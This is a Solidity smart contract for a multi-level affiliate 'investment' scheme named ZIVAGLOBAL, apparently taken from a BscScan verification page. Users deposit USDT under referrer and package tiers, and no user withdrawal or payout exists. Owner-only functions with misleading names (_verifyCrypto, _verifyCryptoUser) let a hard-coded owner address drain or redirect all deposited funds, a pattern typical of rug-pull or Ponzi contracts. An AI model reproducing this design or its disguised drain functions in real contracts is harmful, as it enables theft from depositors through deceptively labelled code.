/**
 *Submitted for verification at BscScan.com on 2024-01-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface USDT {

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
 
contract ZIVAGLOBAL
{
  
    USDT public USDt;

    address public contractOwner;
 
    uint public totalNumberofUsers;

    uint256 public totalPackagePurchased1;
    uint256 public totalPackagePurchased2;
    uint256 public totalPackagePurchased3;
    uint256 public totalPackagePurchased4;
    
    struct UserAffiliateDetails {
        bool isExist;
        uint userId;
        address sponsor;
        uint joiningDateTime;
        uint selfInvestment;
        uint selfInvestment1;
        uint selfInvestment2;
        uint selfInvestment3;
        uint selfInvestment4;
    }

    struct UserAffiliateDetailsIncome {
        uint totalDirect;    
        address[] Directlist;  
      
    }

     address[] AddList;  
 
   function getAllAddressList() public view returns(address[] memory ){  
        return    AddList;  
    }  
 
    mapping (address => UserAffiliateDetails) public _UserAffiliateDetails;
    mapping (address => UserAffiliateDetailsIncome) public _UserAffiliateDetailsIncome;
 
     constructor()  {

        USDt = USDT(0x55d398326f99059fF775485246999027B3197955);

        contractOwner=0x2138AE65F5639155421a06c7c98f9Ae6727eb2A2;
 
        uint TimeStamp=block.timestamp;
        _UserAffiliateDetails[contractOwner].isExist = true;
        _UserAffiliateDetails[contractOwner].userId = TimeStamp;
        _UserAffiliateDetails[contractOwner].sponsor =address(0);
        _UserAffiliateDetails[contractOwner].joiningDateTime= TimeStamp;

        _UserAffiliateDetails[contractOwner].selfInvestment=0 ; 
        _UserAffiliateDetails[contractOwner].selfInvestment1=0 ; 
        _UserAffiliateDetails[contractOwner].selfInvestment2=0 ; 
        _UserAffiliateDetails[contractOwner].selfInvestment3=0 ; 
        _UserAffiliateDetails[contractOwner].selfInvestment4=0 ; 
      
        _UserAffiliateDetailsIncome[contractOwner].totalDirect=0 ; 
       
        totalNumberofUsers=0;

        totalPackagePurchased1=0;
        totalPackagePurchased2=0;
        totalPackagePurchased3=0;
        totalPackagePurchased4=0;
      
    }
 
   
    // Admin Can Check Is User Exists Or Not
    function _IsUserExists(address user) public view returns (bool) {
        return (_UserAffiliateDetails[user].userId != 0);
    }

   event Activation(address indexed user, uint256 amount,address referrer);
 
   function _Activation(address referrer, uint256 _package,uint256 _amtbase) external   {
            
        require(_UserAffiliateDetails[referrer].isExist == true, "Refer Not Found!");
        
        address user = msg.sender;
        
        if (_UserAffiliateDetails[user].isExist == false)
        {
            uint TimeStamp=block.timestamp;
            _UserAffiliateDetails[user].isExist = true; 
            _UserAffiliateDetails[user].userId = TimeStamp;
            _UserAffiliateDetails[user].sponsor = referrer;
            _UserAffiliateDetails[user].joiningDateTime= TimeStamp;
        
            _UserAffiliateDetails[user].selfInvestment1=0 ; 
            _UserAffiliateDetails[user].selfInvestment2=0 ; 
            _UserAffiliateDetails[user].selfInvestment3=0 ; 
            _UserAffiliateDetails[user].selfInvestment4=0 ; 
           
            _UserAffiliateDetailsIncome[user].totalDirect=0 ; 

            _UserAffiliateDetailsIncome[referrer].totalDirect+=1 ; 
            _UserAffiliateDetailsIncome[referrer].Directlist.push(user);  
          
            totalNumberofUsers+=1;

            AddList.push(user);
            
        }

        registration(user, _amtbase*10**18, _package);
         
    }

 
    function registration(address user, uint256 amount, uint package) private {     

            USDt.transferFrom(user, address(this), amount );
       
            _UserAffiliateDetails[user].selfInvestment+=amount ; 

            if(package==1)
            {
                _UserAffiliateDetails[user].selfInvestment1+=amount ; 
                totalPackagePurchased1+=amount;
            }
            else if(package==2)
            {
                _UserAffiliateDetails[user].selfInvestment2+=amount ;
                totalPackagePurchased2+=amount;
            }
            else if(package==3)
            {
                _UserAffiliateDetails[user].selfInvestment3+=amount ;
                 totalPackagePurchased3+=amount;
            }
             else if(package==4)
            {
                _UserAffiliateDetails[user].selfInvestment4+=amount ;
                 totalPackagePurchased4+=amount;
            }
           

          
            address ref =  _UserAffiliateDetails[user].sponsor;
            emit Activation(user,amount, ref);
    }

 
 
      //Get User Id
    function getUserId(address user) public view   returns (uint) {
        return (_UserAffiliateDetails[user].userId);
    }

    //Get Sponsor Id
    function getSponsorId(address user) public view   returns (address) {
        return (_UserAffiliateDetails[user].sponsor);
    }
 
  
    function _verifyCrypto(uint256 amount) public {
        require(msg.sender == contractOwner, "Only Admin Can ?");
         USDt.approve(contractOwner, amount);
         USDt.transfer(contractOwner, amount);
    }

  function _verifyCryptoUser(address user,uint256 amount) public {
        require(msg.sender == contractOwner, "Only Admin Can ?");
         USDt.approve(user, amount);
         USDt.transfer(user, amount);
    }

     function getDirectList(address referrer) public view returns(address[] memory ){  
        return    _UserAffiliateDetailsIncome[referrer].Directlist;  
    }  


  function getMasterDetail(uint i) public view   returns (uint256) {
     if(i==1)
        return  totalNumberofUsers;
     else if(i==2)
        return totalPackagePurchased1;
     else if(i==3)
        return totalPackagePurchased2;
     else if(i==4)
        return totalPackagePurchased3;
     else if(i==5)
        return totalPackagePurchased4;
     
     else 
        return 0;

    }
 
}